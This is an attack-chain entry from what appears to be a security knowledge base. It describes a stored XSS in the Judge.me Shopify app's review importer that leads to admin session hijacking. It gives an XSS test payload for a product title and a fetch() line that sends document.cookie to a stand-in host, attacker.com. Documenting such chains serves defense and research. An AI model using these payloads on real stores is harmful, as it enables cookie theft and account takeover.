---
id: ac-judge-me-xss-hijack
tags:
  - xss
  - stored-xss
  - shopify
  - session-hijacking
  - cookie-theft
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Credential Access]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Malicious-Product-with-XSS-Payload-in-Shopify]]'
  - '[[procedures/Trigger-Stored-XSS-via-Product-Deletion-in-Judge-me-App]]'
  - '[[procedures/Execute-XSS-Payload-to-Steal-Admin-Cookies]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T03:46:38.102Z'
description: >-
  A multi-step attack exploiting stored XSS in the Judge.me Shopify app's
  AliExpress Review Importer to inject a malicious payload via product name and
  trigger it during deletion, leading to admin session hijacking.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Stored XSS in Judge.me Shopify App for Admin Session Hijacking

Multi-stage attack chain demonstrating a complete attack workflow exploiting a stored XSS vulnerability in the Judge.me app's AliExpress Review Importer feature.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Malicious Product] --> B[Delete Product to Trigger XSS]
    B --> C[Execute Payload for Session Hijack]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (manual steps via Shopify admin interface)

### Target Environment

- Shopify store with Judge.me app installed
- AliExpress Review Importer feature enabled
- Admin access to Shopify dashboard

### Initial Access Requirements

- Valid Shopify admin credentials
- Installed and configured Judge.me app
- No special network access beyond standard web

## Detailed Attack Procedures

### Step 1: Create Malicious Product
procedure: [[procedures/Create-Malicious-Product-with-XSS-Payload-in-Shopify]]

**Objective**: Inject a stored XSS payload into a product name without sanitization, setting up the vulnerability for later execution.

**Instructions**: Log in to the Shopify admin dashboard and navigate to Products > Add product. Set the product title to a malicious payload such as `444"><img src=x onerror=prompt(document.domain)>`. Save the product to store the unsanitized input.

**Expected Output**: Product created successfully with the payload in the name field, visible in the product list without escaping.

**Success Indicators**:
- Product appears in the list with raw payload (e.g., visible angle brackets)
- No immediate errors or sanitization applied

### Step 2: Trigger Stored XSS
procedure: [[procedures/Trigger-Stored-XSS-via-Product-Deletion-in-Judge-me-App]]

**Objective**: Access the Judge.me app's importer interface and perform a deletion action that renders the unsanitized product name, executing the XSS payload in the admin context.

**Instructions**: Open the Judge.me app in Shopify admin, navigate to AliExpress Review Importer > Products. Locate the malicious product in the list, select it, and initiate deletion. Confirm the deletion to trigger the rendering of the product name.

**Expected Output**: During deletion, the payload executes, displaying a prompt with the document domain (e.g., shopify.com) if using the test payload.

**Success Indicators**:
- JavaScript alert or prompt appears upon deletion
- No server-side errors blocking the process

### Step 3: Hijack Admin Session
procedure: [[procedures/Execute-XSS-Payload-to-Steal-Admin-Cookies]]

**Objective**: Modify and leverage the executed XSS to exfiltrate admin cookies, enabling session hijacking and unauthorized access.

**Instructions**: Replace the test payload (e.g., prompt) with a data exfiltration script like `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`. Recreate the product with this payload, then repeat deletion to send cookies to the attacker's server.

**Expected Output**: Cookies transmitted to the attacker's endpoint, verifiable via server logs or network inspection.

**Success Indicators**:
- Attacker receives admin session cookies
- Successful replay of cookies grants admin access

## Attack Chain Summary

### Key Achievements

1. Successful injection of unsanitized XSS payload into product data
2. Triggering of stored XSS in admin interface during routine deletion
3. Exfiltration of sensitive admin cookies for session takeover

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Credential Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
